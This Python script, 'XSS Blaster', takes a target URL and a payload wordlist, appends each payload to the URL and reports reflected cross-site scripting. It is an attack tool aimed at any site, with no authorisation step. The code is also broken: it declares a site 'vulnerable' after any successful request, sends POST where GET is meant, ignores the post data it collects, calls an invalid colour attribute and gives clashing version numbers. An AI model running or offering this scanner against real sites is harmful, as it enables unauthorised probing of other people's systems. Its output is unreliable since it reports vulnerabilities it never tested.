## XSS Blaster
## By ShowNadda

# Version 1.0
# Global Imports
import requests
import time
import sys
import colorama
from colorama import Fore, Back, Style
colorama.init()

# Header to send with the request
header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Geko/20100101 Firefox/40.1'}

# Title Screen
print(Fore.GREEN + "XSS BLASTER" + Style.RESET_ALL)
print(Fore.GREEN + "By ShowNadda" + Style.RESET_ALL)
print( Fore.RED + "Version 0.5" + Style.RESET_ALL)
time.sleep(0.5)
print("\n")

# Payload Choice Menu
pc = input("Send Payload via Post or Get? (p/g): ")
if pc == "g":
    try:
            site = input("Enter URL (with Parameters): ")
            r = requests.post(site, headers=header)
            time.sleep(0.5)
            print(Fore.GREEN + " [+] The Site is vulnerable!" + Style.RESET_ALL)
    except:
            print(Fore.YELLOW + "[!] Testing if the Script will respond..." + Style.RESET_ALL)
            time.sleep(2)
            print(Fore.Red + "[-] Error: Site did not Respond." + Style.RESET_ALL)
            print(Fore.Red + "The URL *must* start with 'https://' or 'http://'" + Style.RESET_ALL)
            sys.exit(0)
    print("\n")
    try:
                payloadwordlist = input("[!] Enter Directory for Payload Wordlist: ")
                payloadfind = open(payloadwordlist, "r")
    except FileNotFoundError:
        print(Fore.RED + "[!] Error: File '" + payloadwordlist + "' was not found!")
        sys.exit(0)
    print(Fore.GREEN + "[!] Now Blasting XSS Payloads on Target...")
    time.sleep(1)
    f = open(payloadwordlist,"r")
    l = 1
    for line in f:
        print(Fore.GREEN + "Running the Payload on line " + str(1))
        if line in requests.get(site + line, headers=header).text:
            print(Fore.RED + "XSS found at: \n" + Style.RESET_ALL)
            print(requests.get(site + line, headers=header).url)
        else:
            l += 1
            pass

elif pc == "p":
    try:
            site = input("Enter URL: ")
            data = input("Post Data: ")
            r = requests.post(site, headers=header)
            time.sleep(0.5)
            print(Fore.GREEN + " [+] The Site is vulnerable!" + Style.RESET_ALL)
    except:
            print(Fore.YELLOW + "[!] Testing if the Script will respond..." + Style.RESET_ALL)
            time.sleep(2)
            print(Fore.Red + "[-] Error: Site did not Respond." + Style.RESET_ALL)
            print(Fore.Red + "The URL *must* start with 'https://' or 'http://'" + Style.RESET_ALL)
            sys.exit(0)
    print("\n")
    try:
                payloadwordlist = input("[!] Enter Directory for Payload Wordlist: ")
                payloadfind = open(payloadwordlist, "r")
    except FileNotFoundError:
        print(Fore.RED + "[!] Error: File '" + payloadwordlist + "' was not found!")
        sys.exit(0)
    print(Fore.GREEN + "[!] Now Blasting XSS Payloads on Target...")
    time.sleep(5)
    f = open(payloadwordlist,"r")
    l = 1
    for line in f:
        print(Fore.GREEN + "Running the Payload on line " + str(1))
        if line in requests.get(site + line, headers=header).text:
            print(Fore.RED + "XSS found at: \n" + Style.RESET_ALL)
            print(requests.get(site + line, headers=header).url)
        else:
            l += 1
            pass

else:
        print(Fore.Red + "Site was not vulnerable." + Style.RESET_ALL)
        sys.exit()
